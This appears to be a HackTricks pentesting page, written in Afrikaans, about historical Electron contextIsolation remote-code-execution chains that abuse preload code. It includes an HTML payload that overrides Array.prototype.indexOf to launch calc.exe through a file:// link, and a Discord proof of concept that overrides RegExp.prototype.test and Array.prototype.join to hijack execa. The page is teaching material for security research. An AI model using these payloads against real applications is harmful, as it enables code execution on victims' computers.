# Electron contextIsolation RCE via preload-kode

{{#include ../../banners/hacktricks-training.md}}

Dit is **historiese aanvalskettings** waarin preload-kode JavaScript-intrinsics of bevoorregte API’s met aanvallerbeheerde renderer-inhoud gedeel het. Wanneer context isolation geaktiveer is, het preload en die bladsy gewoonlik afsonderlike JavaScript-realms, en prototipe-oorrides in die bladsy beïnvloed dus nie outomaties preload-objekte nie. Valideer die aanvalsketting teen die presiese Electron-/toepassingsweergawe en bridge-implementering.<sup>[[3]](#references)</sup>

## Voorbeeld 1

Voorbeeld uit [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Hierdie kode open http(s)-skakels met die verstekblaaier:

![Electron contextIsolation RCE via preload-kode - Voorbeeld 1: Hierdie kode open http(s)-skakels met die verstekblaaier](<../../images/image (768).png>)

In die betrokke historiese toepassing kon ’n plaaslike-lêernavigasie soos `file:///C:/Windows/System32/calc.exe` ’n OS-beginpad bereik; `SAFE_PROTOCOLS.indexOf` was bedoel om dit te voorkom.

’n Aanvaller kon dus hierdie JS-kode via XSS of arbitrêre bladsynavigasie inspuit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Aangesien die oproep na `SAFE_PROTOCOLS.indexOf` altyd 1337 sal teruggee, kan die aanvaller die beskerming omseil en calc uitvoer. Finale exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Gaan die oorspronklike skyfies na vir ander maniere om programme uit te voer sonder dat ’n toestemmingsversoek verskyn.<sup>[[1]](#references)</sup>

Die historiese Discord-ketting het ook die laai van UNC-styl `file://127.0.0.1/electron/rce.jar` as ’n ander moontlike uitvoeringspad oorweeg; bevestig dat dit bereikbaar is op die presiese Windows/Electron-bouweergawe.<sup>[[2]](#references)</sup>

## Voorbeeld 2: Discord App RCE

Voorbeeld van [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Toe ek die preload-skripte nagegaan het, het ek gevind dat Discord die funksie aan die webblad blootstel, wat toelaat dat sekere toegelate modules via `DiscordNative.nativeModules.requireModule('MODULE-NAME')` aangeroep word.\
Hier kon ek nie modules gebruik wat direk vir RCE gebruik kan word nie, soos die _child_process_-module, maar ek **het kode gevind waarmee RCE bereik kan word deur die ingeboude JavaScript-metodes te oorheers** en die uitvoering van die blootgestelde module te beïnvloed.

Die volgende is die PoC. Ek kon bevestig dat die **calc**-toepassing **verskyn** wanneer ek die **`getGPUDriverVersions`-funksie aanroep**, wat in die module genaamd "_discord_utils_" gedefinieer is, vanuit devTools terwyl ek **`RegExp.prototype.test` en `Array.prototype.join` oorheers**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Die `getGPUDriverVersions`-funksie probeer die program met die "_execa_"-biblioteek uitvoer, soos volg:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Gewoonlik probeer _execa_ "_nvidia-smi.exe_" uitvoer, wat in die `nvidiaSmiPath`-veranderlike gespesifiseer is. As gevolg van die oorskryfde `RegExp.prototype.test` en `Array.prototype.join` word **die argument egter tydens _execa**_** se interne verwerking verander na "**_**calc**_**"**.

Spesifiek word die argument verander deur die opdragresolusie- en argumentverwerkingspaaie in die historiese `cross-spawn`-ontleder te beïnvloed.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Misbruik van die gebrek aan konteksisolering - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE in die Discord-rekenaartoepassing](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Konteksisolering](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn`-ontleder se hersiening en presiese paaie wat deur die ketting gebruik word (reëls 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
